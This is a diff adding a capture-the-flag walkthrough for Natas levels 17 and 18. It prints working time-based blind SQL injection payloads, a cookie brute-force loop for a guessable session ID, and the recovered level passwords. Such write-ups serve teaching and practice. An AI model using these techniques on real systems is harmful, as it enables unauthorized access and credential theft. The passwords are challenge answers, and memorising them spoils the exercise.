@@ -232,3 +232,64 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Verification:** `http://natas17.natas.labs.overthewire.org/` with `natas17:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L16.cast`
 
+
+## Level 17 → natas18
+- **Account:** `natas17`, password `KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx`.
+- **Goal:** The page runs `SELECT * from users where username="".$_REQUEST["username"].""`. All output about whether the user exists is commented out, so the response never changes — a **blind** SQL injection. The `users` table holds a row `username="natas18"` whose `password` is the next password.
+- **Technique and why it works:** blind SQL injection through **time delays**. We inject `" OR IF(<condition>,SLEEP(5),0)-- -`. The `OR` is essential: the username lookup fails, but the `OR` branch still evaluates, and because the query matches several rows, `SLEEP(5)` runs once per row — a true condition takes about 20 s while a false one returns in under a second. That timing difference is our yes/no oracle. For each character position we binary-search `ORD(SUBSTR(password,pos,1))` between 32 and 127, asking whether the code is `>= mid`; the delay answers each question. The password length (32) is found the same way with `LENGTH(password)`.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `curl -u natas17:<pw> .../index-source.html` shows the query with double quotes and the commented-out existence messages.
+2. **Confirm the injection and the oracle.**
+   ```
+   curl -u natas17:<pw> --data-urlencode 'username=x" OR IF(1=1,SLEEP(5),0)-- -'   # ~20 s
+   curl -u natas17:<pw> --data-urlencode 'username=x" OR IF(1=2,SLEEP(5),0)-- -'   # <1 s
+   ```
+   The delay is per matched row, which is why the true case is ~20 s rather than 5 s.
+3. **Find the length.**
+   ```
+   ... IF((SELECT LENGTH(password) FROM users WHERE username="natas18")=32,SLEEP(5),0)-- -
+   # ~20 s -> the password is 32 characters
+   ```
+4. **Binary-search each character.** For position `pos`, ask whether
+   `(SELECT ORD(SUBSTR(password,pos,1)) FROM users WHERE username="natas18") >= mid`;
+   a true answer (delay) moves the lower bound up, a false one moves the upper
+   bound down. This needs ~7 requests per character.
+   ```
+   python3 - <<'PY'
+   # (script in the recording: timed() measures curl; cond() = timed > 8 s)
+   # for pos in 1..32: binary search lo/hi in [32,127] with ORD(...) >= mid
+   PY
+   ```
+5. **Recovered password:** `fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op`.
+6. **Verify.**
+   ```
+   curl -s -o /dev/null -w '%{http_code}\n' -u natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op http://natas18.natas.labs.overthewire.org/
+   # 200
+   ```
+- **Password for natas18:** `fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op`
+- **Verification:** `http://natas18.natas.labs.overthewire.org/` with `natas18:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L17.cast`
+
+## Level 18 → natas19
+- **Account:** `natas18`, password `fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op`.
+- **Goal:** A login form creates a session with `session_id(rand(1,640))` and stores `$_SESSION["admin"] = isValidAdminLogin()`. The direct `admin` login is disabled, and credentials are printed only when the session's `admin` flag is 1.
+- **Technique and why it works:** the session identifier is a random number in a small range (1..640) and the server keeps the session state. So we **brute-force the PHPSESSID cookie** from 1 to 640: exactly one of those IDs belongs to an existing session with `admin=1` (the pre-seeded admin session). When we hit it, the server loads that session and `print_credentials()` reveals the next password. The weakness is the tiny, guessable session-ID space.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `index-source.html` shows `$maxid = 640`, `session_id(createID(...))` with `createID` returning `rand(1,$maxid)`, and `print_credentials()` gated on `$_SESSION["admin"] == 1`.
+2. **Brute-force the cookie.**
+   ```
+   for sid in 1..640:
+       GET / with Cookie: PHPSESSID=<sid>
+       if "You are an admin" in response: print the <pre> block
+   ```
+   ```
+   FOUND sid 119
+   Username: natas19
+   Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
+   ```
+3. **Verify.** `curl -u natas19:<pw> http://natas19.natas.labs.overthewire.org/` → HTTP 200.
+- **Password for natas19:** `qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT`
+- **Verification:** `http://natas19.natas.labs.overthewire.org/` with `natas19:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L18.cast`
